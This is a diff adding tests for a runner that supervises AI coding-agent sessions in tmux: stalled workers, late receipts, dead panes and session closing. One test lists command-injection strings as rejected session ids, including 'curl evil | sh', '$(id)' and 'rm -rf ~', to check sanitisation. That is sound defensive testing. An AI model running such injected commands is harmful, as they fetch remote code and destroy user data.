@@ -421,3 +421,135 @@ it('a dispatch refused at the write boundary pauses once and is not retried by l
   const failures = getDb().prepare("SELECT COUNT(*) AS n FROM runner_history WHERE runner_id = ? AND type IN ('dispatch_failed','delivery_unconfirmed')").get(runner.id).n;
   assert.equal(failures, 1, 'exactly one refusal is logged, not one per tick');
 });
+
+// ---- plan 123: audit findings ---------------------------------------------
+it('stops nudging a worker that keeps going idle without finishing its plan (plan 123 #2)', async () => {
+  // Timers are 0 in this harness, so every pass may send. The no-progress
+  // budget (3 by default) is the only thing that can end it.
+  const budget = mission.getRunner(runner.id).no_progress_budget;
+  const trace = [];
+  for (let i = 0; i < budget + 4; i += 1) {
+    // The worker takes the nudge, does nothing, and goes idle again.
+    turn = { ...turn, state: 'idle', completedAt: new Date(Date.now() - 1000).toISOString(), progressAt: turn.progressAt };
+    await mission.runnerWatchOnce(runner.id);
+    const r = mission.getRunner(runner.id);
+    trace.push(`${runnerTransition.getRuntime(runner.id).state}/${r.scheduler_decision}/retry=${r.retry_count}/rev=${r.last_dispatch_revision}/sends=${sends.length}`);
+    if (runnerTransition.getRuntime(runner.id).state !== 'running') break;
+  }
+  assert.equal(runnerTransition.getRuntime(runner.id).state, 'waiting_input', 'the runner asks for a human instead of nudging for ever');
+  assert.ok(sends.length <= 1 + budget, `sent ${sends.length} instructions for a budget of ${budget}`);
+  assert.match(mission.getRunner(runner.id).runtimeReason || '', /No progress after/);
+});
+
+const sha = (text) => require('node:crypto').createHash('sha256').update(text.trimEnd()).digest('hex');
+
+it('notices a receipt that lands after the dispatch stopped waiting for it (plan 123 #1)', async () => {
+  mission._setReceiptPollBudget(60);
+  try {
+    let lastText = '';
+    // The pane takes the text, but the worker has not picked it up yet.
+    tmux.sendText = async (_pad, _tmux, text) => { sends.push(text); lastText = text; return { lines: 1 }; };
+    turn = { ...turn, state: 'working' };
+    await workerDone(0);
+    idleNow();
+    await mission.runnerWatchOnce(runner.id);
+    assert.equal(sends.length, 2, 'the next plan was sent');
+    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt', 'and its receipt was not seen in time');
+
+    // A moment later the worker starts on exactly that instruction.
+    turn = { state: 'working', userId: 'late-input', inputHash: sha(lastText), progressAt: new Date().toISOString() };
+    await mission.runnerWatchTick();
+    assert.equal(runnerTransition.getRuntime(runner.id).state, 'running', 'the periodic watch confirms it without a human pressing Reconcile');
+    assert.equal(sends.length, 2, 'and nothing was sent again');
+  } finally {
+    mission._setReceiptPollBudget(5000);
+  }
+});
+
+it('holds an instruction nobody ever picked up, once its deadline has passed (plan 123 #1)', async () => {
+  mission._setReceiptPollBudget(60);
+  try {
+    tmux.sendText = async (_pad, _tmux, text) => { sends.push(text); return { lines: 1 }; };
+    turn = { ...turn, state: 'working' };
+    await workerDone(0);
+    idleNow();
+    await mission.runnerWatchOnce(runner.id);
+    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt');
+    await mission.runnerWatchTick();
+    assert.equal(runnerTransition.getRuntime(runner.id).state, 'awaiting_receipt', 'inside the deadline it keeps waiting');
+
+    const opId = runnerTransition.getRuntime(runner.id).operation_id;
+    getDb().prepare('UPDATE runner_operations SET deadline_at = ? WHERE id = ?').run(new Date(Date.now() - 1000).toISOString(), opId);
+    await mission.runnerWatchTick();
+    assert.equal(runnerTransition.getRuntime(runner.id).state, 'held', 'past it, with the worker idle and no receipt, the operation is held');
+    assert.equal(sends.length, 2, 'never a resend');
+  } finally {
+    mission._setReceiptPollBudget(5000);
+  }
+});
+
+it('does not leave a runner "running" beside a worker pane that died mid-turn (plan 123 #3)', async () => {
+  // The TUI was killed during a tool call: the pane is gone and the store will
+  // say "working" for ever, because nothing is left to finish the turn.
+  turn = { ...turn, state: 'working' };
+  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
+  tmux.hasSession = async () => false;
+  for (let i = 0; i < 3; i += 1) await mission.runnerWatchOnce(runner.id);
+  const state = runnerTransition.getRuntime(runner.id).state;
+  const row = mission.getRunner(runner.id);
+  const acted = sends.length > 1 || row.recovery_count > 0 || state !== 'running';
+  assert.ok(acted, `nothing happened: state=${state} sends=${sends.length} recovery_count=${row.recovery_count} reason=${row.runtimeReason}`);
+});
+
+it('Run after the worker died mid-turn is not refused as "worker not idle" and does not adopt a dead worker (plan 123 #3)', async () => {
+  // Pause while the worker is mid-plan, then its pane dies.
+  turn = { ...turn, state: 'working' };
+  await mission.pauseRunner(runner.id, 'current_task');
+  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
+  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
+  tmux.hasSession = async () => false;
+  let refusal = null;
+  let result = null;
+  try { result = await mission.startRunner(runner.id); } catch (e) { refusal = e; }
+  assert.notEqual(refusal && refusal.code, 'runner_worker_not_idle', 'a dead pane cannot be "mid-turn"');
+  assert.notEqual(result && result.reason, 'adopted_active_turn', 'there is no live worker to adopt');
+  assert.notEqual(refusal && refusal.code, 'runner_invalid_queue', `the fixture reached the gate under test: ${refusal && refusal.message}`);
+});
+
+it('refuses a conversation id that is not a plain token, before anything is started (plan 123 #5)', async () => {
+  const before = getDb().prepare('SELECT COUNT(*) AS n FROM mission_sessions').get().n;
+  for (const bad of ['x; curl evil | sh', '$(id)', 'a b', '`id`', 'ses_ok\nrm -rf ~', "x' -s 'y"]) {
+    await assert.rejects(() => mission.startSession(project.id, { agentSessionId: bad }), (e) => e.code === 'mission_bad_agent_session_id', JSON.stringify(bad));
+  }
+  assert.equal(getDb().prepare('SELECT COUNT(*) AS n FROM mission_sessions').get().n, before, 'no session row was created for a refused id');
+  const drivers = require('../services/drivers');
+  for (const type of ['opencode', 'codex', 'claude']) {
+    const cmd = drivers.getDriver(type).tuiLaunch.resume({ sessionId: 'ses_1; rm -rf ~' });
+    assert.doesNotMatch(cmd, /[;&|`$ ]\s*rm/, `${type}: ${cmd}`);
+    assert.match(cmd, /ses_1rm-rf$/, `${type} keeps only token characters: ${cmd}`);
+  }
+});
+
+it('ending a worker session over MCP stops its runner first, like the page\'s Close (plan 123 #7)', async () => {
+  tmux.killSession = async () => {};
+  assert.equal(runnerTransition.getRuntime(runner.id).state, 'running');
+  await mission.endSession(session.id, { actor: 'key:test' });
+  assert.notEqual(runnerTransition.getRuntime(runner.id).state, 'running', 'the runner no longer supervises a session that was closed on purpose');
+  const sendsBefore = sends.length;
+  tmux.paneState = async () => ({ live: false, tuiAlive: false, command: '', cwd: '' });
+  await mission.runnerWatchTick();
+  assert.equal(sends.length, sendsBefore, 'and the watcher does not bring it back');
+});
+
+it('a plan that ends in a question after a pause leaves the runner waiting for input, not stuck (plan 123 #6)', async () => {
+  turn = { ...turn, state: 'working' };
+  await mission.pauseRunner(runner.id, 'before_next_task');
+  assert.equal(runnerTransition.getRuntime(runner.id).state, 'paused');
+  // The worker finishes the plan it was on by asking a question.
+  let detail = await mission.readRunnerQueue(runner.id);
+  await mission.updateRunnerQueueItem(runner.id, detail.queue.items[0].id, { status: 'need_input', reason: 'Which colour?' }, detail.queue.revision, { actor: 'worker', source: 'worker' });
+  assert.equal(runnerTransition.getRuntime(runner.id).state, 'waiting_input');
+  detail = await mission.readRunnerQueue(runner.id);
+  assert.equal(detail.queue.execution.actions.resolve.allowed, true, 'the page offers Resolve');
+  assert.equal(detail.queue.execution.actions.run.allowed, false);
+});
